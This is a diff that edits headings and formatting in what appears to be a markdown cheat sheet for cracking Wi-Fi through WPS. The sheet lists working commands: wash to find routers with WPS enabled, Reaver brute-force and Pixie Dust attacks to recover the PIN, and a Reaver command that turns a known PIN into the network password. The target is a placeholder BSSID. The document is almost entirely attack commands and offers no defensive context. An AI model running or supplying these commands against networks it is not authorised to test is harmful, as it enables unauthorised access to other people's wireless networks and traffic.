@@ -2,13 +2,13 @@
 ### Check for networks with wps available
 wash -i wlan0mon
 
-```code
+```text
 BSSID               Ch  dBm  WPS  Lck  Vendor    ESSID
 --------------------------------------------------------------------------------
 AA:BB:CC:XX:YY:ZZ    1  -88  2.0  No   Broadcom  linksys
 ```
 
-### ATTACKS TO RETRIEVE THE PIN
+### Attacks to retrieve the pin
 
 #standard attack
 sudo reaver  -i wlan0mon -b AA:BB:CC:XX:YY:ZZ -vv
@@ -17,13 +17,9 @@ sudo reaver  -i wlan0mon -b AA:BB:CC:XX:YY:ZZ -vv
 sudo reaver -i wlan0mon -b AA:BB:CC:XX:YY:ZZ -vv -K 1
 
 
-
-
-### Getting a WiFi password with a known WPS pin in Reaver
+### Resolve password from pin
 
 sudo reaver -i wlan0mon -b AA:BB:CC:XX:YY:ZZ -vv -p 12345678
-
-
 
 
 
